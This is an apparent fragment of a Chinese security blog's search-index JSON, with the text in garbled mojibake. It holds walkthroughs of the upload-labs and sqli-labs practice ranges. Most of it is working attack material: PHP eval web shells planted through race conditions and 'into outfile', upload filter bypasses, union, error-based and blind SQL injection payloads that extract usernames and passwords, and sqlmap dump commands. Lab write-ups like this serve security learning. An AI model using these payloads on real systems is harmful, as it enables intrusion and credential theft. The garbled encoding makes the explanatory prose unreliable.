if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; è¿è¡Œè„šæœ¬å‘½ä»¤\n1 jpg_payload.php 1.jpg pass18 ä»£ç å®¡è®¡ï¼Œä¼ å…¥æ–‡ä»¶ä¸åˆ é™¤æœ‰æ—¶é—´å·®\næ€è·¯ï¼š\næ¡ä»¶ç«äº‰ä»£ç \n1 2 3 4 5 6 //18.php \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; #è®¿é—®18.phpï¼Œä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªshell.php ç”¨bpæ¥é‡å¤ä¸Šä¼ \nå‘åˆ°intruderæ¨¡å—ï¼Œpayloadè®¾ç½®ä¸ºç©ºï¼Œç”¨äºæ— é™è®¿é—®\nçº¿ç¨‹è®¾ç½®å¤§ç‚¹\nå¼€å§‹çˆ†ç ´ï¼ŒåŒæ—¶è¦æ‰‹åŠ¨è®¿é—®æ–‡ä»¶\npythonè®¿é—®\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xxx/upload-labs/upload/18.php\u0026#34; while True: html = requests.get(url) if html.status_code == 200: print(\u0026#34;OK\u0026#34;) break pass19 åŸé¢˜æœ‰ç‚¹é—®é¢˜\næ”¹myuploadçš„æºç \næ‹¼æ¥/\nåˆ©ç”¨apachè§£ææ¼æ´\n1 xxx.php.* -\u0026gt;xxx.php ç„¶åæˆ‘ä»¬bpä¸æ–­ä¸Šä¼ ç™½åå•å†…çš„åç¼€\nä¾‹å¦‚shell.php.7z\nå¦ä¸€ç§æ€è·¯ï¼Œå°†ä¸Šä¸€å…³é‡å¤ç”Ÿæˆä»£ç çš„æœ¨é©¬åšæˆå›¾ç‰‡é©¬\nåå¤ä¸Šä¼ å›¾ç‰‡é©¬\nè¿™é‡Œè®¿é—®çš„pythonè„šæœ¬ä¸ºï¼š\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png\u0026#34; while True: html = requests.get(url) if ( \u0026#39;Warning\u0026#39; not in str(html.text)): print(\u0026#39;ok\u0026#39;) break ç›´åˆ°ç”Ÿæˆshell.phpä¸ºæ­¢\npass20 åˆ©ç”¨å‡½æ•°æ¼æ´\n1 move_uploaded_file()ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ä¸´æ—¶æ–‡ä»¶ç§»åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ï¼Œå¹¶ç¡®ä¿æ–‡ä»¶åœ¨ç§»åŠ¨ä¸­ä¸ä¼šè¢«åˆ é™¤æˆ–è¦†ç›–ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ shell.php/.ä¸Šä¼ åä¼šå˜æˆshell.php\npass21 ä¿®æ”¹content-type ä¿®æ”¹POSTå‚æ•°ä¸ºæ•°ç»„ç±»å‹ï¼Œå°±æ˜¯save_name[]; ç´¢å¼•[0]ä¸ºshell.phpï¼Œ ç´¢å¼•[2]ä¸ºjpg|png|gifã€‚ åªè¦ç¬¬äºŒä¸ªç´¢å¼•ä¸ä¸º1ï¼Œå°±æ˜¯ä¸èƒ½ä¸ºsave_name[1]; $file[count($file) - 1]å°±ç­‰ä»·äº$file[2-1]ï¼Œå€¼ä¸ºç©ºç»•è¿‡\næ¼æ‰«å·¥å…· https://github.com/almandin/fuxploider\né˜²å¾¡ linuxæ–‡ä»¶æƒé™ ","date":"2024-10-09T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"æ–‡ä»¶ä¸Šä¼ æ¼æ´"},{"content":"sqli-labsé¶åœºç»ƒä¹  less1 å°è¯•å•å¼•å·é—­åˆï¼Œæ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚\nåˆ¤æ–­å­—æ®µæ•° æ‰¾å›æ˜¾ç‚¹\næ”¶é›†ä¿¡æ¯\nçˆ†ç ´æ•°æ®åº“ 1 2 3 4 5 6 7 çˆ†ç ´æ•°æ®åº“ ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ group_concat()å‡½æ•°å¯ä»¥è®©å¤šä¸ªæ•°æ®åœ¨ä¸€è¡Œæ˜¾ç¤ºï¼Œä½†æ˜¯åªèƒ½æ˜¾ç¤º64ä½ï¼Œå¯ä»¥é€‰æ‹©æˆªå–æˆ–è€…ç”¨limitçš„æ–¹å¼ æ˜¾ç¤ºå…¨éƒ¨æ•°æ® ?id=-1\u0026#39; union select 1,2,(schema_name) from information_schma.schemata limit 0,1--+ çˆ†ç ´è¡¨å 1 2 3 çˆ†ç ´è¡¨å ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ çˆ†ç ´å­—æ®µå 1 2 3 çˆ†ç ´å­—æ®µå ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ çˆ†ç ´å­—æ®µ 1 2 3 çˆ†ç ´å­—æ®µ ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from users)--+ less1 sqlmapçš„è¿ç”¨ 1 python sqlmap.py -u ip --batch//è·³è¿‡è¯¢é—® pythonç¯å¢ƒæ‰“å¼€\n1 2 çŒœè§£å½“å‰æ•°æ®åº“åç§° sqlmap.py -u ip --batch --current-db 1 2 çŒœè§£è¡¨å sqlmap.py -u ip --batch -D \u0026#34;security\u0026#34; --tables 1 2 çŒœè§£å­—æ®µ sqlmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --columns 1 2 è„±åº“ sqmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --dump less2 æ•°å­—å‹æ³¨å…¥\nåˆ¤æ–­å­—æ®µæ•°\n1 ?id=1 or 1=2 order by 4--+ æ‰¾åˆ°å›æ˜¾ç‚¹ï¼Œä¿¡æ¯æ”¶é›†\n1 ?id=-1 union select 1,2,3--+ å¼€å§‹æ³¨å…¥\n1 2 3 4 5 6 7 8 9 10 11 12 çˆ†ç ´æ•°æ®åº“ ?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+ çˆ†ç ´è¡¨å•å ?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ çˆ†ç ´å­—æ®µ ?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ çˆ†ç ´å­—æ®µå†…å®¹ ?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)- -+ less3 é—­åˆæ–¹å¼æ˜¯')\nåˆ¤æ–­å­—æ®µæ•°\n1 ?id=1\u0026#39;) and 1=1\torder by 4--+ æ‰¾å›æ˜¾ç‚¹ï¼Œä¿¡æ¯æ”¶é›†ï¼Œç„¶åæ³¨å…¥\n1 2 3 4 5 6 7 8 9 10 11 12 çˆ†ç ´æ•°æ®åº“ ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(schema_name)from information_schema.schemata--+ çˆ†ç ´è¡¨å• ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ çˆ†ç ´å­—æ®µ ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(colum_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ çˆ†ç ´æ•°æ® ?id=1\u0026#39;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less4 é—­åˆæ–¹å¼æ˜¯\u0026quot;)\n1 2 3 4 5 6 7 8 9 ä¿¡æ¯æ”¶é›†ï¼Œå­—æ®µåˆ¤æ–­ï¼Œçˆ†ç ´æ•°æ®åº“è¡¨ ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ çˆ†ç ´å­—æ®µ ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(column_name)from information_schema.columns where table_name=\u0026#34;users\u0026#34;--+ æœ€åçˆ†ç ´å‡ºæ‰€æœ‰æ•°æ® ?id=1\u0026#34;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less5 æ²¡æœ‰ç”¨æˆ·å’Œidçš„å›æ˜¾ï¼ŒæŸ¥çœ‹æœ‰æ— æŠ¥é”™å›æ˜¾ï¼Œæ‰¾åˆ°é—­åˆæ–¹å¼\né—­åˆä¸ºå•å¼•å·é—­åˆï¼ŒæŸ¥å­—æ®µæ•°\nè¿™è¾¹è¾“å…¥ä¸ºå‡çš„æ¡ä»¶çœ‹çœ‹\næŸ¥çœ‹æºç ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥\næŠ¥é”™æ³¨å…¥ æŠ¥é”™å¸¸ç”¨çš„ä¸‰ä¸ªå‡½æ•°ï¼Œextractvalue(),updatexml(),floor(),è¿˜æœ‰exp(),\n1. ç”¨extractvalueå‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ 1 2 3 çˆ†ç ´æ•°æ®åº“ ?id=1\u0026#39; or/and extractvalue(1,concat(0x7e,database()/(select database()),0x7e))--+ 1 2 3 çˆ†ç ´æ•°æ®åº“è¡¨ ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))--+ 1 2 3 çˆ†ç ´å­—æ®µ ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e))--+ group-concat()å‡½æ•°å¯èƒ½æ”¾ä¸ä¸‹æ‰€æœ‰å†…å®¹ï¼Œå¯ä»¥é‡‡ç”¨æˆªå–æˆ–è€…limitå‡½æ•°è¯»å–\n1 2 3 çˆ†ç ´æ•°æ®å†…å®¹ ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))--+ 2. ç”¨updatexml()å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ 1 2 3 4 5 6 7 8 9 10 11 çˆ†ç ´æ•°æ®åº“ ?id=1\u0026#39; or/and updatexml(1,concat(0x7e,database()/(select database()),0x7e),1)--+ çˆ†ç ´æ•°æ®åº“è¡¨ ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ çˆ†ç ´å­—æ®µ ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e),1)--+ çˆ†ç ´æ•°æ®å†…å®¹ ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ 3.é€šè¿‡floor()å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå‰æéœ€è¦çŸ¥é“æœ‰å¤šå°‘å­—æ®µæ•° 1 2 3 çˆ†ç ´æ•°æ®åº“ ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 çˆ†ç ´æ•°æ®åº“è¡¨ ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 çˆ†ç ´å­—æ®µ ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 çˆ†ç ´æ•°æ®åº“å†…å®¹ ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (username)from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ sqlmapæ¢­less5 -dbsæšä¸¾æ•°æ®åº“ ä½¿ç”¨-oå‚æ•°ä¼˜åŒ–,\u0026ndash;batchå‚æ•°è¿›è¡Œè·³è¿‡ï¼Œ\u0026ndash;threadså‚æ•°å¼€å¯æ›´å¤šçº¿ç¨‹\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 -o --threads=10 -dbs --batch æ³¨æ„ï¼Œè€—æ—¶è¿‡ä¹…ï¼Œä¸»è¦æ˜¯è”åˆæŸ¥è¯¢è€—æ—¶ï¼Œä»ç»“æœçœ‹å¹¶æ²¡æœ‰è”åˆæŸ¥è¯¢æ³¨å…¥ã€‚\n\u0026ndash;tablesæšä¸¾æ•°æ®åº“è¡¨ æ·»åŠ \u0026ndash;techniqueå‚æ•°åŠ é€Ÿï¼Œ\u0026ndash;dbmsæŒ‡å®š\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o --threads=10 -D security --tables --batch \u0026ndash;columnsæšä¸¾åˆ— 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users --columns --batch \u0026ndash;dumpæšä¸¾æ•°æ® 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users -C username,password --dump --batch less6 æŠŠless5çš„å•å¼•å·é—­åˆæ”¹ä¸ºåŒå¼•å·\nless7 çœ‹å›æ˜¾\nSQlæ³¨å…¥çš„å†™å…¥ä¸è¯»å–\nè¯»å–æ–‡ä»¶ load_file(æ–‡ä»¶çš„è·¯å¾„)\nå†™å…¥æ–‡ä»¶into outfile(),into_dumpfile()\nçŒœé—­åˆæ–¹å¼æ˜¯\u0026rsquo;))\nçŒœå­—æ®µæ•°\né€šè¿‡é¡µé¢å›æ˜¾å¸ƒå°”æ–¹å¼çŒœè§£åˆ°å­—æ®µæ•°ä¸º3ï¼Œèƒ½å¤Ÿè¯»å†™éœ€è¦çš„å‡ ä¸ªæ¡ä»¶\néœ€è¦é«˜æƒé™(rootæƒé™)\néœ€è¦æœ‰é—®ä»·å†™å…¥æƒé™secure_file_privä¸æ˜¯NULL\néœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„\né­”æœ¯å¼•å·gbcæ—¶å…³é—­çš„ magic_quotes_gpc = Off\nå…³é”®æ­¥éª¤ï¼šå†™å…¥æœ¨é©¬ 1 2 ?id=1\u0026#39;)) and 1=2 union select 1,2,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]) ?\u0026gt;\u0026#34;%20 into outfile \u0026#34;X:\\\\xx\\\\xx\\\\xx\\\\xx\\\\shell.php\u0026#34;--+ å°é—®é¢˜ï¼šæ–‡ä»¶æ— æ³•å†™å…¥ åŸå› æ˜¯MySQLæ•°æ®åº“é‡Œ\nsecure_file_priv è¿™ä¸ªå‚æ•°è®¾ç½®ä¸ºäº†nullæˆ–è€…æ²¡æœ‰è®¾è¿™ä¸ªå‚æ•°ã€‚\nå†™å…¥åèšå‰‘ææƒã€‚\nè¦å°†urlååŠ shell.phpæ‰èƒ½è¿ä¸Š\nless8 æ‰¾åˆ°é—­åˆæ–¹å¼ä¸ºå•å¼•å·ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•å·²ç»ä¸èƒ½å¤Ÿå®ç°æ³¨å…¥\nå¯¹å’Œé”™è¿”å›ä¸åŒçš„é¡µé¢å›æ˜¾ï¼Œå¯ä»¥é‡‡ç”¨å¸ƒå°”ç›²æ³¨çš„æ–¹å¼\nå¸ƒå°”ç›²æ³¨ åˆ¤æ–­å­—æ®µæ•°\nå­—æ®µæ•°ä¸º3\n1 2 3 çŒœè§£æ•°æ®åº“åå­—çš„é•¿åº¦ ?id=-1\u0026#39; or length(database())=8--+ å°tipsï¼šä¸€é‚£ä¹ˆé‡‡ç”¨é€»è¾‘æˆ–ï¼Œå› ä¸ºæ— æ³•ç¡®ä¿å‰é¢çš„æ¡ä»¶ä¸€å®šä¸ºçœŸ 1 2 3 4 5 6 é€ä¸€çŒœè§£æ•°æ®åº“ ?id=-1\u0026#39; or ascii(substr(database(),1,1))=115--+ æˆ–è€… ?id=-1\u0026#39; or ascii(mid(database(),1,1))=115--+ æˆ–è€… ?id=-1\u0026#39; or mid(database(),1,1)=\u0026#39;s\u0026#39;--+ æŒ‰ç…§ç›¸åŒçš„æ–¹æ³•çŒœè§£æ•°æ®è¡¨çš„åå­—å’Œå­—æ®µå†…å®¹\n1 2 ?id=-1\u0026#39; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+ å¯¹äºå¸ƒå°”ç›²æ³¨çš„é—®é¢˜ï¼Œä¸€èˆ¬é‡‡ç”¨è„šæœ¬è¿›è¡ŒçŒœè§£æˆ–è€…ä½¿ç”¨sqlmap\nsqlmapæ¢­less8 -dbsæšä¸¾æ•°æ®åº“ 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 -o -dbs --batch \u0026ndash;tablesæšä¸¾æ•°æ®åº“è¡¨ 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security --tables --batch \u0026ndash;columnsæšä¸¾åˆ— 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users --columns --batch \u0026ndash;dumpæšä¸¾æ•°æ® 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users -C username,password --dump --batch å…³äºsqlmap \u0026ndash;technique å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 Bï¼šBoolean-based blindï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰ Eï¼šError-basedï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰ Uï¼šUnion query-basedï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰ Sï¼šStacked queriesï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰ Tï¼šTime-based blindï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰ Qï¼šInline queriesï¼ˆåµŒå¥—æŸ¥è¯¢æ³¨å…¥ï¼‰ less9 æ€ä¹ˆé—­åˆéƒ½ä¸å¯¹\nè¯•è¯•æ—¶é—´ç›²æ³¨\n1 2 ä¾‹å¦‚ ?id=-1\u0026#39; or if(length(database())=8,sleep(5),0)--+ å‘ç°ç•Œé¢æœ‰å»¶è¿Ÿ\n1 2 3 çŒœè§£æ•°æ®åº“åç§° ?id=-1\u0026#39; or if(ascii(mid(database(),1,1))\u0026lt;=135,sleep(5),0)--+ ç›¸åŒçš„æ–¹å¼çŒœè§£æ•°æ®è¡¨æ•°æ®å­—æ®µ sqlmapæ¢­less9 æŠŠå‚æ•°æ”¹ä¸ºT\nless10 ä¸Less9çš„åŒºåˆ«åœ¨äºé—­åˆæ–¹å¼ä¸º åŒå¼•å·ï¼ŒåŒæ ·æ˜¯æ—¶é—´ç›²æ³¨\nless11 è¿›å…¥POSTæ³¨å…¥\nçœ‹è§ç™»å…¥æ¡†ï¼Œä¸ºæ–¹ä¾¿æ³¨å…¥ï¼Œbpå¯åŠ¨\nå•å¼•å·é—­åˆä¸”å­—æ®µæ•°ä¸º2\nè”åˆæ³¨å…¥\nsqlmapçš„POSTè¿ç”¨ 1ã€æŒ‡å®šæ¢æµ‹æ³¨å…¥ç‚¹ 1 2 3 4 5 6 7 8 9 10 æ–¹å¼ä¸€ å¯åŠ¨sqlmapæ¢æµ‹æ³¨å…¥ç‚¹ python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch çˆ†ç ´å½“å‰æ•°æ®åº“å python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch --current-db çˆ†ç ´æ•°æ®è¡¨ python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security --tables æœ€åè„±åº“ python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security -T users - -dump 2ã€å°†æŠ“åŒ…å†…å®¹ä¿å­˜åˆ°.txtæ–‡ä»¶ä¸­ 1 2 å¯åŠ¨sqlmap python sqlmap.py -r txtæ–‡ä»¶ä½ç½® -p è¦æ‰«æçš„ç‚¹ 1 2 3 4 5 6 çˆ†ç ´æ•°æ®åº“ python sqlmap.py -r .txtæ–‡ä»¶ä½ç½® -p æ‰«æçš„ä½ç½® --current-db çˆ†ç ´è¡¨ python sqlmap.py -r .txtæ–‡ä»¶ä½ç½® -p æ‰«æçš„ä½ç½® -D security --tables è„±åº“ pyhton sqlmap.py -r .txtæ–‡ä»¶ä½ç½® -p æ‰«æçš„ä½ç½® -D security --dump less12 é—­åˆæ–¹å¼ä¸º\u0026quot;),è¿˜æ˜¯bpå¯åŠ¨\nè”åˆæ³¨å…¥å’ŒæŠ¥é”™æ³¨å…¥éƒ½è¡Œ\né‡‡ç”¨extractvalue()å‡½æ•°æŠ¥é”™æ³¨å…¥ 1 2 æŸ¥è¯¢æ•°æ®åº“è¡¨ uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select database()),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 çˆ†ç ´æ•°æ®è¡¨ uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 çˆ†ç ´å­—æ®µå uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 3 çˆ†ç ´å­—æ®µ uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit ç”¨updatexml()å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ 1 2 3 4 5 6 7 8 9 10 11 æŸ¥è¯¢æ•°æ®åº“è¡¨ uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´æ•°æ®è¡¨ uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´å­—æ®µå uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´å­—æ®µ uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit ç”¨floor()å‡½æ•°è¿›è¡Œçˆ†ç ´ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 çˆ†ç ´æ•°æ®åº“ uname=-1\u0026#34;) union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´æ•°æ®è¡¨ uname=-1\u0026#34;) union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´å­—æ®µè¡¨ uname=-1\u0026#34;) union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit çˆ†ç ´å­—æ®µ uname=-1\u0026#34;) union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit less13 é—­åˆæ–¹å¼æ”¹æˆâ€˜ï¼‰ï¼Œå’Œless12ä¸€æ ·\nless14 é—­åˆæ–¹å¼æ”¹æˆ\u0026quot;,å’Œless12ä¸€æ ·\nless15 é€šè¿‡å›¾ç‰‡å›æ˜¾é—­åˆæ–¹å¼ä¸ºå•å¼•å·é—­åˆ\næ­£ç¡®çš„æ•°æ®ä¸é”™è¯¯æ•°æ®é¡µé¢å›æ˜¾çš„å›¾ç‰‡ä¸ä¸€æ ·ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹å¸ƒå°”ç›²æ³¨\n1 uname=admin\u0026#39; and length(database())\u0026gt;=8--+\u0026amp;passwd=admin\u0026amp;submit=Submit ä¸çŒœäº†ï¼Œç›´æ¥sqlmap\nsqlmapæ¢­less15 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --current-db å…¨é€‰yesï¼Œç›´æ¥çˆ†ç ´å‡ºæ—¶é—´ç›²æ³¨ã€‚\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump less16 é—­åˆæ”¹ä¸º\u0026quot;),å’Œless15ä¸€æ ·\nless17 æ³¨å…¥ç‚¹å˜ä¸ºå¯†ç çš„åœ°æ–¹\nsqlmapæ¢­less17 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt -p \u0026#34;passwd\u0026#34; -D security --dump less18 ç½‘é¡µè®°å½•äº†æœ¬åœ°ipçš„ä¿¡æ¯ï¼Œè¯´æ˜å¯èƒ½æ˜¯æ•°æ®åº“è®°å½•äº†æœ¬æœºçš„ä¿¡æ¯ï¼Œå³åå°è·å–äº†ä¸€äº›è¯¸å¦‚Ipçš„ä¿¡æ¯ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”é¡µé¢è¿”å›äº†æ•°æ®åŒ…user-agentçš„ä¿¡æ¯ï¼Œé‚£ä¹ˆåœ¨è¯·æ±‚å¤´ä¸­å°±å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹\nçœ‹æºç \næºä»£ç æ ‡è¯†è·å–æµè§ˆå™¨ä¿¡æ¯ï¼Œå³user-Agentéƒ¨åˆ†ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯é€šè¿‡ä»€ä¹ˆæµè§ˆå™¨å‘åå°è¯·æ±‚\nåœ¨åé¢çš„è¯·æ±‚ä¸­ä¹Ÿæœ‰å°†è¯¥éƒ¨åˆ†è¿›è¡Œå­˜å‚¨æ·»åŠ åˆ°æ•°æ®åº“ï¼Œç°åœ¨å°±å¯ä»¥é€šè¿‡ä¸€äº›æ‰‹æ®µåœ¨æ•°æ®æ·»åŠ çš„åŒæ—¶è¿›è¡Œæ³¨å…¥\npayloadæ”¹bpä¸­uers-agentéƒ¨åˆ†\n1 \u0026#39;and updatexml(1,concat(0x7e,database(),0x7e),1),1,1)# sqlmapå¤´éƒ¨æ³¨å…¥ åœ¨å¤´éƒ¨æ³¨å…¥çˆ†ç ´ä¸­ï¼Œsqlmapéœ€è¦æé«˜æ‰«æç­‰çº§ levelå’Œrisk\n1 2 3 level x(xä¸º1-5) å½“ä¸º2æ—¶ä¼šå¯¹å¤´éƒ¨çš„cookieè¿›è¡Œæ‰«ææ³¨å…¥å°è¯•ï¼Œx\u0026gt;=3æ—¶é˜Ÿuser-Agent,ip,referer å‚æ•°è¿›è¡Œæ‰«æ risk x(x 1-3) 1æ—¶è¿›è¡Œå¤§éƒ¨åˆ†æ‰«æ 2ä¼šå¢åŠ åŸºäºäº‹ä»¶çš„æµ‹è¯•è¯­å¥ 3ä¼šå¢åŠ orè¯­å¥çš„sqlæ³¨å…¥ 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --level=3 --current-db æˆ–è€…æŒ‡å®šå¤´éƒ¨çˆ†ç ´\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --user-agent=\u0026#34;*\u0026#34; --thread=10 --dbs 1 python sqlmap.py -u 